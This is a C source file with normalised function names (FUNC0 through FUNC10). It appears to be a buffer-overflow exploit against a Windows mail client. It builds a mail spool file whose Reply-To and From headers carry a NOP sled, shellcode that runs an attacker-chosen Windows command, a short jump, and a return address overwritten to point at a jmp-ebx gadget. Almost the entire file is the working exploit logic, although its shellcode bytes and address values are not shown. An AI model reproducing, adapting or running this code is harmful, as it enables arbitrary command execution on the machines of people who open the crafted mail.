#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
typedef  int /*<<< orphan*/  FILE ;

/* Variables and functions */
 size_t BUFEND ; 
 size_t CMDLENP ; 
 char* FUNC ; 
 char* HEADER1 ; 
 char* HEADER2 ; 
 size_t JMPADR ; 
 int JMP_EBX_ADR ; 
 int /*<<< orphan*/  NOP ; 
 int RETADR ; 
 int /*<<< orphan*/  FUNC0 (int) ; 
 char* exploit_code ; 
 int /*<<< orphan*/  FUNC1 (int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/ * FUNC2 (char*,char*) ; 
 int /*<<< orphan*/  FUNC3 (int /*<<< orphan*/ *,char*,char*) ; 
 int /*<<< orphan*/  FUNC4 (char*,int,char,int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  FUNC5 (char*,int /*<<< orphan*/ ,size_t) ; 
 int /*<<< orphan*/  FUNC6 (char*,...) ; 
 int /*<<< orphan*/  FUNC7 (char*,char*) ; 
 char FUNC8 (char*) ; 
 int /*<<< orphan*/  FUNC9 (char*,char*,char) ; 

FUNC10(int argc,char *argv[])
{
    FILE        *fp;
    static char buf[10000];
    int         i,r,ip;

    if (argc!=3){
        FUNC6("usage : %s MailSpoolDirectry WindowsCommand\n",argv[0]);
        FUNC0(1);
    }
    
    if ((fp=FUNC2(argv[1],"wb"))==NULL){
        FUNC6("Permittion denied :-P\n");
        FUNC0(1);
    }   
    FUNC4(HEADER1,1,FUNC8(HEADER1),fp);

    FUNC5(buf,NOP,BUFEND);
    FUNC7(exploit_code,FUNC);
    FUNC7(exploit_code,argv[2]);
    exploit_code[CMDLENP]=FUNC8(argv[2]);
    FUNC9(buf+RETADR+4,exploit_code,FUNC8(exploit_code));

    ip=JMP_EBX_ADR;
    buf[JMPADR]  =0xeb;
    buf[JMPADR+1]=0x06;
    buf[RETADR+3]=0xff&(ip>>24);
    buf[RETADR+2]=0xff&(ip>>16);
    buf[RETADR+1]=0xff&(ip>>8);
    buf[RETADR]  =ip&0xff;
    buf[BUFEND]  =0;

    FUNC3(fp,"Reply-To: \"%s\" <hehehe@hohoho.com>\n",buf);
    FUNC3(fp,"From: \"%s\" <hehehe@hohoho.com>\n",buf);

    FUNC4(HEADER2,1,FUNC8(HEADER2),fp);
    FUNC1(fp);
}